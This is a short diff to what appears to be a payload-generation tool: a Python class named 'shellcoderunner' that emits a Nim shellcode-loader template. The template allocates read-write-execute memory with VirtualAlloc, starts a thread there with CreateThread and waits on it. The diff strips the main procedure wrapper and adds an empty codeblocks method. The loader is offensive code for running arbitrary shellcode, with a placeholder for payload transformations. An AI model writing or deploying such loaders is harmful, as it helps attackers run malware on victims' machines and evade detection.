@@ -9,14 +9,12 @@ class shellcoderunner:
 
     def compilerOptions(self) -> list[str]:
         return []
+    
+    def codeblocks(self) -> str:
+        return """"""
 
     def template(self) -> str:
         return """
-{imports}
-{codeblocks}
-
-proc main() =
-    
     {transformers}
 
     let address = VirtualAlloc(NULL, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
@@ -24,5 +22,4 @@ proc main() =
     let hThread = CreateThread(NULL, 0.SIZE_T, cast[LPTHREAD_START_ROUTINE](address), NULL, 0, NULL)
     WaitForSingleObject(hThread, INFINITE)
 
-main()
 """
